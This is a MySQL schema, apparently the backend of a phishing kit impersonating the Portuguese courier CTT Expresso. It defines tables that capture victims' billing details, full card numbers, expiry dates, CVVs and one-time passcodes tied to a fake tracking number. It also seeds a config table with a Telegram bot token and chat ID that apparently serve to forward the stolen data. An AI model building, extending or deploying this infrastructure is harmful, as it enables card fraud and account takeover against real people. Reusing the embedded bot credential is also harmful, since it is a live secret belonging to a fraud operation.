-- CTT Expresso Database Setup for MySQL
CREATE DATABASE IF NOT EXISTS ctt_expresso;
USE ctt_expresso;

-- Table for storing billing information
CREATE TABLE billing_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    session_id VARCHAR(20) UNIQUE NOT NULL,
    nome VARCHAR(255) NOT NULL,
    email VARCHAR(255) NOT NULL,
    endereco TEXT NOT NULL,
    codigo_postal VARCHAR(20) NOT NULL,
    cidade VARCHAR(100) NOT NULL,
    telefone VARCHAR(20) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Table for storing card information  
CREATE TABLE card_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    session_id VARCHAR(20) NOT NULL,
    numero_cartao VARCHAR(20) NOT NULL,
    data_expiracao VARCHAR(10) NOT NULL,
    cvv VARCHAR(4) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (session_id) REFERENCES billing_data(session_id)
);

-- Table for storing OTP verification data
CREATE TABLE otp_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    session_id VARCHAR(20) NOT NULL,
    otp_code TEXT NOT NULL,
    tracking_number VARCHAR(20) NOT NULL,
    verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (session_id) REFERENCES billing_data(session_id)
);

-- Table for configuration (Telegram tokens)
CREATE TABLE config (
    id INT AUTO_INCREMENT PRIMARY KEY,
    config_key VARCHAR(100) UNIQUE NOT NULL,
    config_value TEXT NOT NULL,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

-- Insert Telegram configuration
INSERT INTO config (config_key, config_value) VALUES 
('TELEGRAM_BOT_TOKEN', '8482443491:AAE2BLcm95hkizPLXXDVUXenHjamWd2qdws'),
('TELEGRAM_CHAT_ID', '-1003023517840');